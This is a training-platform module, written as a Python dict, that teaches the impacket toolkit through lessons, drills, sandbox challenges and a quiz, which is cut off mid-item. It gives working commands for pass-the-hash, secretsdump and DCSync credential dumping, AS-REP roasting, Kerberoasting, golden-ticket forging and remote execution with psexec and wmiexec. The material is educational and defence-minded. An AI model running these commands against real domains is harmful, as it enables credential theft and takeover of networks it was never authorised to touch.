"""impacket: the Python toolkit that speaks Windows protocols directly.

netexec, smbclient and ldapsearch each answer one question about a domain.
impacket is the collection underneath most of that: about sixty scripts that
implement SMB, MS-RPC, Kerberos and LDAP in Python, so they can do things a
Windows client will not, such as authenticate with a hash instead of a
password or forge a ticket from a key.

**Why it earns a module.** Two ideas carry the whole toolkit, and neither is
guessable. First, every script takes the **same target string**, so once you
can write `domain/user:password@host` you can drive all sixty. Second,
**authentication is a separate axis from the tool**: password, NT hash, or
Kerberos ticket are three ways to satisfy the same script, which is what
pass-the-hash actually means in practice. Learn those two and the scripts
become interchangeable parts rather than sixty things to memorise.

**The flag style is its own hazard**, so it is taught explicitly: impacket
uses single-dash long options, `-just-dc` and `-hashes` and `-outputfile`, not
the double dash every other tool on this roster uses. Typing `--just-dc` gets
you an unhelpful error, and it is the first thing everyone does.

**Scope, as everywhere in this group: the tool, never the engagement.** What
each script asks the protocol for, and how to read what comes back. Nothing
here selects a target.

**Verification is honest.** These scripts talk to a domain controller and D1
forbids the trainer from touching a network, so anything live is self-marked.
What is verified is the half that is genuinely offline and genuinely the
harder skill: reading the output. Real secretsdump and GetUserSPNs output is
in the sandbox, and the challenges make you turn it into something a cracker
can eat.
"""

MODULE = {
    'id': 'impacket',
    'title': 'impacket',
    'group': 'Security',
    'blurb': 'One target string, three ways to authenticate, and the scripts that use them.',
    'context': 'You are at a Linux shell with impacket installed, working against a lab domain.',
    'needs': ['secretsdump.py'],
    'prereqs': ['smbenum', 'ldapsearch'],
    'adapter': 'sandbox',
    'estimate': '3-4 hours',
    'order': 88,

    'lessons': [
        {
            'id': 'imp-target',
            'title': 'One target string, and the dash that catches you',
            'next': 'imp-auth',
            'concept': (
                'impacket is about sixty scripts and they share one calling '
                'convention, which is the single most useful thing to know '
                'about it. Every script takes the same positional target:\n\n'
                '`[[domain/]username[:password]@]<target>`\n\n'
                'So `CORP/alice:Summer2026@10.0.0.10` is domain CORP, user '
                'alice, that password, that host. Leave the password off and '
                'the script prompts, which is what you want: a password on the '
                'command line is visible in `ps` to every user on the machine '
                'and lands in your shell history. Leave the whole credential '
                'off and you get a null session attempt.\n\n'
                'The domain matters more than it looks. For local '
                'authentication to a standalone host you use the host name or '
                'a dot as the domain; for a domain account you must give the '
                'domain, because Kerberos and NTLM both need to know which '
                'authority is being asked.\n\n'
                '**Then the flag style.** impacket takes single-dash long '
                'options: `-hashes`, `-just-dc`, `-outputfile`, `-dc-ip`, '
                '`-no-pass`, `-request`. Not `--hashes`. Every other tool in '
                'this roster uses the double dash, so this is the mistake '
                'everyone makes on their first command, and the error message '
                'does not point at the dash.\n\n'
                '`-dc-ip` deserves its own mention: when the target is a '
                'NetBIOS name you cannot resolve, or when DNS points somewhere '
                'unhelpful, that flag tells the script which machine is '
                'actually the domain controller.\n\n'
                'Two scripts are the everyday siblings of the tools in the '
                'smbenum module. `lookupsid.py` is RID cycling without the '
                'rpcclient loop: it asks the host to translate SIDs to names '
                'and walks the RID space for you. `smbclient.py` is an '
                'smbclient-style share prompt that takes the same target '
                'string and `-hashes` as everything else here. Neither is '
                'exotic; they are how you list users and open a share once '
                'you already have a credential.\n\n'
                'The target string is one axis. The next lesson is the '
                'second: whether you authenticate with a password, a '
                'hash, or a ticket.'
            ),
            'examples': [
                {
                    'label': 'The target string, four ways',
                    'code': ('CORP/alice:Summer2026@10.0.0.10   everything\n'
                             'CORP/alice@10.0.0.10              prompts\n'
                             'alice@10.0.0.10                   no domain\n'
                             '10.0.0.10                         null session\n'
                             '\n'
                             '[[domain/]username[:password]@]<target>'),
                    'note': 'Omit the password and it prompts, which keeps it '
                            'out of ps output and your shell history.',
                },
                {
                    'label': 'Single dash, always',
                    'code': ('secretsdump.py -just-dc CORP/alice@10.0.0.10\n'
                             'GetUserSPNs.py -request -dc-ip 10.0.0.10 ...\n'
                             '\n'
                             'not --just-dc\n'
                             'not --request'),
                    'note': 'The one impacket habit worth building '
                            'deliberately, because every other tool here '
                            'taught you the opposite.',
                },
                {
                    'label': 'The two everyday scripts',
                    'code': ('lookupsid.py CORP/alice@10.0.0.10\n'
                             'smbclient.py CORP/alice@10.0.0.10\n'
                             '\n'
                             'lookupsid.py  rpcclient lookupsids, as a script\n'
                             'smbclient.py  smbclient, with this target string'),
                    'note': 'Same target string, same -hashes. These are the '
                            'siblings of rpcclient and smbclient, not extras.',
                },
            ],
            'misconceptions': [
                'impacket options take a single dash, not two. `--just-dc` '
                'fails with an error that does not mention the dash, and this '
                'is the commonest first-command failure.',
                'The target is positional and comes last, after the flags. It '
                'is not `-t` or `--target`.',
                'A missing domain is not the same as a wrong one. For a domain '
                'account the domain is part of the identity, and leaving it '
                'off attempts a local logon instead.',
            ],
            'try_it': [
                'Run any impacket script with `--help` and find the target '
                'line in the usage block. It is the same on all of them.',
            ],
        },
        {
            'id': 'imp-auth',
            'title': 'Password, hash, or ticket: the second axis',
            'next': 'imp-dump',
            'concept': (
                'Password, hash, or ticket is how every impacket script '
                'authenticates. That is why once you have any one of them you '
                'can use all sixty, and why a hash on `-hashes` needs no '
                'cracking.\n\n'
                '**A password** goes in the target string, or is prompted '
                'for.\n\n'
                '**A hash** goes in `-hashes LMHASH:NTHASH`. NTLM '
                'authentication never sends the password, it proves knowledge '
                'of the NT hash, so the hash is as good as the password and '
                'nothing needs cracking. That is pass-the-hash, and it is a '
                'property of the protocol rather than a flaw in a tool. The LM '
                'half is long dead, so you will see it written as a run of '
                'zeroes or empty: `-hashes :‍<nthash>` is normal and correct.\n\n'
                '**A ticket** is Kerberos. Point `KRB5CCNAME` at a credential '
                'cache and add `-k`, and the script uses the ticket instead. '
                '`-no-pass` goes with it, telling the script not to ask for a '
                'password it does not need. This is why clock skew matters: '
                'Kerberos rejects tickets when the clocks differ by more than '
                'five minutes, and the error looks like an authentication '
                'failure rather than a time problem.\n\n'
                'The practical consequence is that these tools compose. '
                'secretsdump gives you hashes; those hashes go straight into '
                '`-hashes` on psexec or wmiexec; that shell gives you more '
                'material. Nothing in the chain needs a cracked password.'
            ),
            'examples': [
                {
                    'label': 'The same script, three credentials',
                    'code': ('psexec.py CORP/alice:Pass@10.0.0.20\n'
                             'psexec.py -hashes :2b576acbe6bc CORP/alice@10.0.0.20\n'
                             'KRB5CCNAME=alice.ccache psexec.py -k -no-pass \\\n'
                             '    CORP/alice@dc01.corp.local'),
                    'note': 'Identical script, three ways to satisfy it. The '
                            'hash form is pass-the-hash and needs no cracking.',
                },
                {
                    'label': 'Why the LM half is empty',
                    'code': ('-hashes LMHASH:NTHASH     the full form\n'
                             '-hashes :2b576acbe6bc     LM omitted, normal\n'
                             '-hashes aad3b435...:...   LM as the empty value\n'
                             '\n'
                             'NTLM proves knowledge of the NT hash,\n'
                             'so the hash IS the credential'),
                    'note': 'aad3b435b51404eeaad3b435b51404ee is the LM hash '
                            'of nothing, and seeing it means LM is unused.',
                },
            ],
            'misconceptions': [
                'Pass-the-hash is not cracking. The hash is what NTLM '
                'authentication actually proves knowledge of, so it is used '
                'directly and the plaintext is never needed.',
                'A Kerberos failure is often a clock failure. More than five '
                'minutes of skew and tickets are rejected, and the message '
                'reads like bad credentials.',
                '`-k` on its own still tries to prompt. Pair it with '
                '`-no-pass` so the script uses the ticket and stops asking.',
            ],
            'try_it': [
                'Look at the `-hashes` help text on three different impacket '
                'scripts and confirm it is identical on all of them.',
            ],
        },
        {
            'id': 'imp-dump',
            'title': 'secretsdump, and the three places secrets live',
            'next': 'imp-kerberos',
            'concept': (
                '`secretsdump.py` is how you pull SAM, LSA secrets, and NTDS '
                'hashes into one output format. That is why reading the '
                '`user:rid:lmhash:nthash` line is most of the skill, and why '
                'the same dump feeds a cracker or `-hashes`.\n\n'
                'It pulls from three places. **SAM** holds the local accounts '
                'of one machine. **LSA secrets** hold service account '
                'passwords, cached domain logons and machine account keys, '
                'often in plaintext. **NTDS.dit** is the domain database on a '
                'domain controller, which is every account in the domain.\n\n'
                'Against a domain controller, `-just-dc` gets the domain '
                'hashes and skips the local machine, and `-just-dc-ntlm` skips '
                'the Kerberos keys as well when you only want something to '
                'feed a cracker. It performs a **DCSync**: it asks the '
                'controller to replicate directory data, which is a legitimate '
                'operation that any account with replication rights can '
                'request, which is exactly why those rights are worth '
                'auditing.\n\n'
                'It also runs **offline**. Given hive files copied off a '
                'machine, the special target `LOCAL` parses them with no '
                'network at all: `secretsdump.py -sam SAM -system SYSTEM '
                'LOCAL`. The SYSTEM hive is needed because it holds the boot '
                'key that decrypts the rest, which is why SAM alone is not '
                'enough.\n\n'
                'The output format is fixed and worth memorising: '
                '`user:rid:lmhash:nthash:::`. That shape is what every cracker '
                'expects, which makes `-outputfile` and a little text handling '
                'the natural next step.'
            ),
            'examples': [
                {
                    'label': 'Where the secrets are',
                    'code': ('secretsdump.py CORP/alice@10.0.0.20\n'
                             '    SAM + LSA from one machine\n'
                             '\n'
                             'secretsdump.py -just-dc CORP/alice@dc01\n'
                             '    the whole domain, by DCSync\n'
                             '\n'
                             'secretsdump.py -sam SAM -system SYSTEM LOCAL\n'
                             '    offline, from copied hives, no network'),
                    'note': 'LOCAL is a literal target keyword. SYSTEM is '
                            'required because it carries the boot key.',
                },
                {
                    'label': 'The output line, and what to do with it',
                    'code': ('Administrator:500:aad3b435...:31d6cfe0d16ae931:::\n'
                             '  user        rid  lmhash      nthash\n'
                             '\n'
                             'cut -d: -f4 dump.txt > nt.txt\n'
                             'hashcat -m 1000 nt.txt rockyou.txt'),
                    'note': 'Mode 1000 is NTLM. Field 4 is the NT hash, which '
                            'is the only field a cracker wants.',
                },
            ],
            'misconceptions': [
                'A dump is not a crack. NTLM hashes are usable directly with '
                '`-hashes`, so cracking is optional and often unnecessary.',
                'RID 500 is the built-in Administrator whatever it has been '
                'renamed to, and machine accounts end with a `$`. Both matter '
                'when you are deciding which lines are interesting.',
                '`-just-dc` against a domain controller is a replication '
                'request, not a file read. It leaves a very different trace '
                'from copying NTDS.dit, which is the point for a defender.',
            ],
            'try_it': [
                'Run `secretsdump.py --help` and find `-sam`, `-system` and '
                'the LOCAL target. That is the offline path.',
            ],
        },
        {
            'id': 'imp-kerberos',
            'title': 'Asking Kerberos for crackable material',
            'next': 'imp-exec',
            'concept': (
                'Two scripts ask the domain controller for things it will hand '
                'to anyone, and both produce material a cracker can chew on '
                'offline. They are worth understanding as a defender because '
                'neither requires a foothold.\n\n'
                '**GetNPUsers.py** is AS-REP roasting. An account with '
                '"do not require Kerberos preauthentication" set will have the '
                'controller return an encrypted blob to *anyone* who asks, '
                'with no credentials at all. `-request` asks for it and '
                '`-format hashcat` writes it in a form hashcat understands. '
                'The fix is to unset that flag, and finding accounts with it '
                'is a one-line LDAP query.\n\n'
                '**GetUserSPNs.py** is Kerberoasting, and it needs any valid '
                'domain account. Any user can request a service ticket for any '
                'service principal name, and part of that ticket is encrypted '
                'with the service account\'s password key. So a normal user '
                'can ask for tickets for every service account and take them '
                'away to crack. `-request` fetches them; `-outputfile` saves '
                'them.\n\n'
                'That is why service account passwords matter so much more '
                'than user passwords: they are the ones exposed to offline '
                'cracking by design, and the defence is length rather than '
                'rotation. A thirty-character service password cannot be '
                'cracked no matter how many tickets are collected.\n\n'
                '`ticketer.py` is the other direction: given a key, it forges '
                'tickets. That is the golden and silver ticket material, and '
                'it is the reason the krbtgt key is the most sensitive secret '
                'in a domain.'
            ),
            'examples': [
                {
                    'label': 'Forging a ticket, and what it needs',
                    'code': 'ticketer.py -nthash HASH \\\n  -domain-sid S-1-5-21-... \\\n  -domain corp.local Administrator\n\n-nthash the krbtgt hash, -domain-sid the domain',
                    'note': 'A golden ticket needs the krbtgt hash and the domain SID, and nothing else. That is why the krbtgt hash is the thing worth protecting.',
                },
                {
                    'label': 'No credentials needed at all',
                    'code': ('GetNPUsers.py CORP/ -usersfile users.txt \\\n'
                             '    -format hashcat -outputfile asrep.txt\n'
                             '\n'
                             'hashcat -m 18200 asrep.txt rockyou.txt'),
                    'note': 'Works with no password because preauth is off on '
                            'those accounts. Mode 18200 is AS-REP.',
                },
                {
                    'label': 'One valid account, every service',
                    'code': ('GetUserSPNs.py -request -dc-ip 10.0.0.10 \\\n'
                             '    -outputfile spn.txt CORP/alice\n'
                             '\n'
                             'hashcat -m 13100 spn.txt rockyou.txt'),
                    'note': 'Mode 13100 is Kerberoast. Any domain user can ask, '
                            'which is why service passwords must be long.',
                },
            ],
            'misconceptions': [
                'Kerberoasting is not an exploit. Requesting a service ticket '
                'is what Kerberos is for, and the crackable part is a '
                'consequence of the design, so the defence is password length '
                'rather than a patch.',
                'AS-REP roasting needs no credentials whatsoever, which is why '
                'the preauth-disabled flag is worth auditing before anything '
                'else in a domain.',
                'The hashcat modes differ and matter: 18200 for AS-REP, 13100 '
                'for Kerberoast, 1000 for the NTLM hashes secretsdump '
                'produces.',
            ],
            'try_it': [
                'Run `GetUserSPNs.py --help` and find `-request` and '
                '`-outputfile`, then check the same flags exist on '
                'GetNPUsers.py.',
            ],
        },
        {
            'id': 'imp-exec',
            'title': 'The exec family, and how loud each one is',
            'concept': (
                'Four scripts give you command execution on a Windows host '
                'with the same credential, and they differ in mechanism, which '
                'means they differ in what they leave behind. Choosing between '
                'them is the tool skill; a defender should know them because '
                'each has a different signature.\n\n'
                '**psexec.py** uploads a service binary to `ADMIN$` and '
                'creates a Windows service to run it. Fully interactive, '
                'SYSTEM level, and by far the loudest: a new service and a '
                'file written to disk both make excellent detections.\n\n'
                '**smbexec.py** creates a service too, but runs commands '
                'through `cmd.exe` and reads output from a temporary file, so '
                'it writes no binary. Semi-interactive and quieter.\n\n'
                '**wmiexec.py** uses WMI instead, so there is no service and '
                'no file on disk. Semi-interactive: each command is separate, '
                'and there is no real shell. It is the usual default now, and '
                'it is quiet on disk while being obvious in WMI logging if '
                'anyone is looking.\n\n'
                '**atexec.py** schedules a task, which is the noisiest in the '
                'logs and the least interactive, but it works when the others '
                'are blocked.\n\n'
                'All four take the same target string and the same `-hashes`, '
                'so switching between them is one word. The reason a defender '
                'cares: "someone got a shell" is not one event, it is four '
                'different traces, and knowing which you are looking at tells '
                'you which tool was used.'
            ),
            'examples': [
                {
                    'label': 'The same job, four mechanisms',
                    'code': ('psexec.py  CORP/alice@10.0.0.20   service + binary\n'
                             'smbexec.py CORP/alice@10.0.0.20   service, no file\n'
                             'wmiexec.py CORP/alice@10.0.0.20   WMI, no service\n'
                             'atexec.py  CORP/alice@10.0.0.20 whoami\n'
                             '\n'
                             'loud  <-------------------------> quiet on disk'),
                    'note': 'Same credential, same target string. The choice is '
                            'about mechanism and trace, not capability.',
                },
                {
                    'label': 'With a hash, and one command',
                    'code': ('wmiexec.py -hashes :2b576acbe6bc \\\n'
                             '    CORP/alice@10.0.0.20 "whoami /all"\n'
                             '\n'
                             'a trailing command runs once and exits,\n'
                             'instead of opening a shell'),
                    'note': 'A command on the end is scriptable and leaves less '
                            'behind than an interactive session.',
                },
            ],
            'misconceptions': [
                'These are not exploits. Every one of them is a documented '
                'remote administration mechanism being used with valid '
                'credentials, which is exactly why they are hard to '
                'distinguish from legitimate administration.',
                'wmiexec is not a shell. Each command is a separate execution '
                'with no shared state, so `cd` does not persist the way you '
                'expect.',
                'Quiet on disk is not quiet. wmiexec writes no file and still '
                'produces WMI activity, a logon event and network traffic.',
            ],
            'try_it': [
                'Read the first ten lines of `psexec.py --help` and '
                '`wmiexec.py --help` side by side and note how much of the '
                'interface is identical.',
            ],
        },
    ],

    'drills': [
        {'id': 'impd-target', 'type': 'command',
         'answer': 'secretsdump.py CORP/alice@10.0.0.20',
         'prompt': 'Dump secrets from a host, prompting for the password.',
         'teach': 'Omitting the password makes the script prompt, keeping it '
                  'out of ps output and shell history.'},
        {'id': 'impd-hashes', 'type': 'command',
         'answer': 'secretsdump.py -hashes :2b576acbe6bc CORP/alice@10.0.0.20',
         'prompt': 'Authenticate with an NT hash rather than a password.',
         'teach': 'Single dash on -hashes, and an empty LM half is normal '
                  'because LM is long dead.'},
        {'id': 'impd-justdc', 'type': 'command',
         'answer': 'secretsdump.py -just-dc CORP/alice@dc01.corp.local',
         'prompt': 'Pull only the domain hashes from a domain controller.',
         'teach': 'A DCSync: it asks the controller to replicate, which any '
                  'account with replication rights may do.'},
        {'id': 'impd-local', 'type': 'command',
         'answer': 'secretsdump.py -sam SAM -system SYSTEM LOCAL',
         'prompt': 'Parse copied registry hives offline, with no network.',
         'teach': 'LOCAL is a literal target keyword. SYSTEM is required '
                  'because it holds the boot key that decrypts SAM.'},
        {'id': 'impd-ntlm-only', 'type': 'command',
         'answer': 'secretsdump.py -just-dc-ntlm CORP/alice@dc01',
         'prompt': 'Get domain NTLM hashes only, skipping the Kerberos keys.',
         'teach': 'Smaller output when all you want is something to feed a '
                  'cracker.'},
        {'id': 'impd-asrep', 'type': 'command',
         'answer': 'GetNPUsers.py CORP/ -usersfile users.txt -format hashcat',
         'prompt': 'Ask for AS-REP material for a list of users, with no '
                   'credentials.',
         'teach': 'Only accounts with preauthentication disabled answer, and '
                  'they answer to anyone, which is why that flag is worth '
                  'auditing.'},
        {'id': 'impd-spn', 'type': 'command',
         'answer': 'GetUserSPNs.py -request -dc-ip 10.0.0.10 CORP/alice',
         'prompt': 'Request service tickets for every service account.',
         'teach': 'Kerberoasting. Any valid domain user may ask, so the '
                  'defence is service password length, not rotation.'},
        {'id': 'impd-spn-out', 'type': 'command',
         'answer': 'GetUserSPNs.py -request -outputfile spn.txt CORP/alice',
         'prompt': 'Save requested service tickets to a file for cracking.',
         'teach': 'The file is already in hashcat format. Mode 13100 for '
                  'Kerberoast, 18200 for AS-REP.'},
        {'id': 'impd-psexec', 'type': 'command',
         'answer': 'psexec.py CORP/alice@10.0.0.20',
         'prompt': 'Get an interactive SYSTEM shell by creating a service.',
         'teach': 'The loudest of the four: a service is created and a binary '
                  'is written to ADMIN$, both excellent detections.'},
        {'id': 'impd-wmiexec', 'type': 'command',
         'answer': 'wmiexec.py CORP/alice@10.0.0.20',
         'prompt': 'Execute commands over WMI, leaving no service or file.',
         'teach': 'Semi-interactive: each command is separate, so cd does not '
                  'persist the way a shell would.'},
        {'id': 'impd-wmiexec-cmd', 'type': 'command',
         'answer': 'wmiexec.py CORP/alice@10.0.0.20 "whoami /all"',
         'prompt': 'Run one command over WMI and exit, without a shell.',
         'teach': 'Scriptable, and leaves less behind than an interactive '
                  'session.'},
        {'id': 'impd-kerb', 'type': 'command',
         'answer': 'psexec.py -k -no-pass CORP/alice@dc01.corp.local',
         'prompt': 'Authenticate with a Kerberos ticket from your cache.',
         'teach': '-k uses KRB5CCNAME and -no-pass stops it asking for a '
                  'password it does not need. Watch for clock skew.'},
        {'id': 'impd-dcip', 'type': 'command',
         'answer': 'GetUserSPNs.py -dc-ip 10.0.0.10 -request CORP/alice',
         'prompt': 'Name the domain controller explicitly when DNS will not.',
         'teach': 'Needed when the target is a NetBIOS name you cannot '
                  'resolve, which is common on a flat lab network.'},
        {'id': 'impd-ticketer', 'type': 'command',
         'answer': 'ticketer.py -nthash HASH -domain-sid SID -domain corp.local Administrator',
         'prompt': 'Forge a Kerberos ticket from a key you already hold.',
         'teach': 'Golden ticket material. It is why the krbtgt key is the '
                  'most sensitive secret in a domain.'},
    ],

    'challenges': [
        {
            'id': 'impc-read-dump',
            'title': 'Turn a dump into something a cracker eats',
            'goal': 'secretsdump output has a fixed shape. Pull the parts that '
                    'matter out of it, which is the step between running the '
                    'tool and getting anywhere.',
            'setup': {'kind': 'sandbox', 'shell': 'bash', 'tree': {
                'dump.txt':
                    '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n'
                    '[*] Using the DRSUAPI method to get NTDS.DIT secrets\n'
                    'CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:'
                    '31d6cfe0d16ae931b73c59d7e0c089c0:::\n'
                    'CORP\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:'
                    '7c4ee9b1d4a3c1e2f5a6b7c8d9e0f1a2:::\n'
                    'CORP\\alice:1103:aad3b435b51404eeaad3b435b51404ee:'
                    '8846f7eaee8fb117ad06bdd830b7586c:::\n'
                    'CORP\\svc_sql:1108:aad3b435b51404eeaad3b435b51404ee:'
                    'e19ccf75ee54e06b06a5907af13cef42:::\n'
                    'CORP\\WKS01$:1120:aad3b435b51404eeaad3b435b51404ee:'
                    'a1b2c3d4e5f60718293a4b5c6d7e8f90:::\n'
                    'CORP\\DC01$:1000:aad3b435b51404eeaad3b435b51404ee:'
                    'f0e1d2c3b4a5968778695a4b3c2d1e0f:::\n'
                    '[*] Kerberos keys grabbed\n'
                    'CORP\\alice:aes256-cts-hmac-sha1-96:9f8e7d6c5b4a\n',
            }},
            'solution': {'shell':
                'grep ":::" dump.txt | grep -v "\\$:" | cut -d: -f4 '
                '> nt.txt && '
                'grep ":::" dump.txt | grep "\\$:" | cut -d\\\\ -f2 '
                '| cut -d: -f1 > machines.txt && '
                'grep ":::" dump.txt | awk -F: \'$2 == 500 || $2 == 502\' '
                '> builtin.txt'},
            'steps': [
                {'instruction': 'Write nt.txt holding just the NT hashes of '
                                'the real user accounts. Field 4 is the NT '
                                'hash, and machine accounts end in a dollar '
                                'sign.',
                 'hint': 'grep ":::" dump.txt | grep -v "\\$:" | cut -d: -f4'},
                {'instruction': 'Write machines.txt listing the machine account '
                                'names, which are the ones you just excluded.',
                 'hint': 'grep "\\$:" and take the name before the first colon'},
                {'instruction': 'Write builtin.txt holding the lines whose RID '
                                'is 500 or 502: the real Administrator and '
                                'krbtgt, whatever they have been renamed to.',
                 'hint': "awk -F: '$2 == 500 || $2 == 502'"},
                {'instruction': 'Note that nt.txt is already what hashcat wants '
                                'for mode 1000, and that you never needed the '
                                'plaintext to use these.'},
            ],
            'free': 'From dump.txt produce nt.txt (NT hashes of user accounts '
                    'only), machines.txt (machine account names), and '
                    'builtin.txt (the RID 500 and 502 lines).',
            'verify': {'kind': 'sandbox', 'expect': {
                'file_contains': {'nt.txt': ['8846f7eaee8fb117ad06bdd830b7586c',
                                             'e19ccf75ee54e06b06a5907af13cef42'],
                                  'machines.txt': ['WKS01$', 'DC01$'],
                                  'builtin.txt': ['Administrator', 'krbtgt']},
                'file_lacks': {'nt.txt': 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
                               'builtin.txt': 'svc_sql'}}},
            'fallback': 'self',
        },
        {
            'id': 'impc-roast-triage',
            'title': 'Sort roastable accounts by what they are worth',
            'goal': 'A roast output is a to-do list, and the order matters. '
                    'Separate the material by type and pick the account worth '
                    'attention first.',
            'setup': {'kind': 'sandbox', 'shell': 'bash', 'tree': {
                'spn.txt':
                    '$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$aa11\n'
                    '$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web01.corp.local*$bb22\n'
                    '$krb5tgs$23$*svc_backup$CORP.LOCAL$CIFS/backup01.corp.local*$cc33\n',
                'asrep.txt':
                    '$krb5asrep$23$oldsvc@CORP.LOCAL:dd44$ee55\n'
                    '$krb5asrep$23$intern@CORP.LOCAL:ff66$aa77\n',
                'admins.txt': 'Administrator\nsvc_backup\ndomain_admins_are_here\n',
            }},
            'solution': {'shell':
                'cut -d\\* -f2 spn.txt | cut -d"$" -f1 | sort > spn-users.txt && '
                'sed -e "s/^.\\$krb5asrep\\$23\\$//" -e "s/@.*//" asrep.txt '
                '| sort > asrep-users.txt && '
                'comm -12 spn-users.txt <(sort admins.txt) > priority.txt && '
                'printf "13100 kerberoast\\n18200 asrep\\n" > modes.txt'},
            'steps': [
                {'instruction': 'Write spn-users.txt with the account name from '
                                'each Kerberoast hash, sorted. The name is the '
                                'field between the first and second asterisk.',
                 'hint': 'cut -d\\* -f2 spn.txt | cut -d"$" -f1 | sort'},
                {'instruction': 'Write asrep-users.txt with the account name '
                                'from each AS-REP hash, sorted. Those are '
                                'before the @.',
                 'hint': 'strip the $krb5asrep$23$ prefix and everything from @'},
                {'instruction': 'Write priority.txt holding any roastable '
                                'account that also appears in admins.txt. That '
                                'is the one to spend cracking time on.',
                 'hint': 'comm -12 spn-users.txt <(sort admins.txt)'},
                {'instruction': 'Write modes.txt recording the two hashcat mode '
                                'numbers, so you stop looking them up.',
                 'hint': '13100 is Kerberoast, 18200 is AS-REP'},
            ],
            'free': 'Produce spn-users.txt and asrep-users.txt holding the '
                    'account names from each file, priority.txt holding the '
                    'roastable account that is also an admin, and modes.txt '
                    'with the two hashcat mode numbers.',
            'verify': {'kind': 'sandbox', 'expect': {
                'file_contains': {'spn-users.txt': ['svc_sql', 'svc_web',
                                                    'svc_backup'],
                                  'asrep-users.txt': ['oldsvc', 'intern'],
                                  'priority.txt': 'svc_backup',
                                  'modes.txt': ['13100', '18200']},
                'file_lacks': {'priority.txt': 'svc_sql'}}},
            'fallback': 'self',
        },
        {
            'id': 'impc-lab-domain',
            'title': 'Run it against a domain you built',
            'goal': 'Everything above was a text file. impacket talks to a '
                    'domain controller, and D1 forbids the trainer from '
                    'touching one, so this is yours to run.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Stand up a lab domain you own, or use a '
                                'retired box on a platform that permits it. '
                                'Never a domain you were not asked to test.'},
                {'instruction': 'Write the target string from memory and check '
                                'it: domain, user, host, single-dash flags.',
                 'hint': 'CORP/alice@10.0.0.10, and -dc-ip if DNS is unhelpful'},
                {'instruction': 'Request Kerberoast material and save it, then '
                                'confirm the file is already hashcat-shaped.',
                 'hint': 'GetUserSPNs.py -request -outputfile spn.txt CORP/alice'},
                {'instruction': 'Take one NT hash you have and use it with '
                                '-hashes rather than cracking it, so you have '
                                'done pass-the-hash once and understand it is '
                                'not cracking.'},
                {'instruction': 'Get execution three ways (psexec, smbexec, '
                                'wmiexec) and look at what each left behind in '
                                'the event log. That is the defender half.'},
            ],
            'free': 'On a lab domain you own: authenticate with a target '
                    'string, request Kerberoast material, use a hash with '
                    '-hashes instead of cracking it, and compare the traces '
                    'psexec, smbexec and wmiexec leave.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
    ],

    'quiz': [
        {'id': 'impq-dash', 'type': 'mcq',
         'prompt': 'Your first impacket command fails on the flags. What is '
                   'the usual cause?',
         'answer': 'impacket long options take a single dash: -just-dc, not '
                   '--just-dc.',
         'distractors': ['The target must be given with -t.',
                         'Flags have to come after the target.',
                         'The domain has to be uppercase.'],
         'teach': 'Every other tool on this roster uses two dashes, which is '
                  'exactly why this one catches everybody once.'},
        {'id': 'impq-target', 'type': 'mcq',
         'prompt': 'What does `CORP/alice@10.0.0.10` with no password do?',
         'answer': 'Prompts for the password, which keeps it out of ps and '
                   'your shell history.',
         'distractors': ['Attempts a null session.',
                         'Fails, because the password is required.',
                         'Reads the password from KRB5CCNAME.'],
         'teach': 'The same target string works on all sixty scripts, which is '
                  'the most useful single fact about the toolkit.'},
        {'id': 'impq-pth', 'type': 'mcq',
         'prompt': 'Why can an NT hash be used directly with -hashes?',
         'answer': 'NTLM authentication proves knowledge of the hash, not the '
                   'password, so the hash is the credential.',
         'distractors': ['impacket cracks it in memory first.',
                         'The hash is reversible for short passwords.',
                         'Only if the account has a blank LM hash.'],
         'teach': 'That is pass-the-hash, and it is a property of the protocol '
                  'rather than a flaw in any tool.'},
        {'id': 'impq-lm', 'type': 'mcq',
         'prompt': 'Every account shows LM hash aad3b435b51404eeaad3b435b51404ee. '
                   'What does that mean?',
         'answer': 'It is the LM hash of an empty value, so LM is not in use.',
         'distractors': ['Every account shares the same password.',
                         'The dump was truncated.',
                         'Those accounts are disabled.'],
         'teach': 'LM is long dead. Seeing that constant means the field is '
                  'empty, which is why -hashes :NTHASH is normal.'},
        {'id': 'impq-local', 'type': 'mcq',
         'prompt': 'What does the LOCAL target mean to secretsdump?',
         'answer': 'Parse hive files given with -sam and -system offline, with '
                   'no network at all.',
         'distractors': ['Dump the secrets of the machine you are running on.',
                         'Use local rather than domain authentication.',
                         'Write output to the local directory.'],
         'teach': 'SYSTEM is required alongside SAM because it holds the boot '
                  'key that decrypts it.'},
        {'id': 'impq-asrep', 'type': 'mcq',
         'prompt': 'What does AS-REP roasting require from you?',
         'answer': 'Nothing. Accounts with preauthentication disabled answer '
                   'anyone who asks.',
         'distractors': ['Any valid domain account.',
                         'Local administrator on one domain-joined host.',
                         'Replication rights in the domain.'],
         'teach': 'Which is why that flag is worth auditing before anything '
                  'else. Kerberoasting is the one that needs a valid account.'},
        {'id': 'impq-spn-defence', 'type': 'mcq',
         'prompt': 'What actually defends a service account against '
                   'Kerberoasting?',
         'answer': 'A long password, because the ticket is crackable offline '
                   'by design.',
         'distractors': ['Rotating the password every thirty days.',
                         'Removing the service principal name.',
                         'Blocking Kerberos ticket requests from users.'],
         'teach': 'Requesting the ticket is what Kerberos is for, so you '
                  'cannot block it. You can make the offline crack hopeless.'},
        {'id': 'impq-exec', 'type': 'mcq',
         'prompt': 'Which exec script leaves no service and no file on disk?',
         'answer': 'wmiexec, which uses WMI instead of creating a service.',
         'distractors': ['psexec, because it cleans up after itself.',
                         'smbexec, because it writes no binary.',
                         'atexec, because a scheduled task is not a file.'],
         'teach': 'Quiet on disk is not silent: WMI activity, a logon event '
                  'and network traffic all remain.'},
        {'id': 'impq-dcsync', 'type': 'mcq',
         'prompt': 'What is secretsdump -just-dc actually doing?',
         'answer': 'Asking the controller to replicate directory data, which '
                   'any account with replication rights may request.',
         'distractors': ['Reading NTDS.dit off the disk over SMB.',
                         'Dumping LSASS on the domain controller.',
                         'Exploiting a flaw in the DRSUAPI service.'],
         'teach': 'It is a legitimate operation, which is why auditing who '
                  'holds replication rights is the defence.'},
        {'id': 'impq-kerb-fail', 'type': 'mcq',
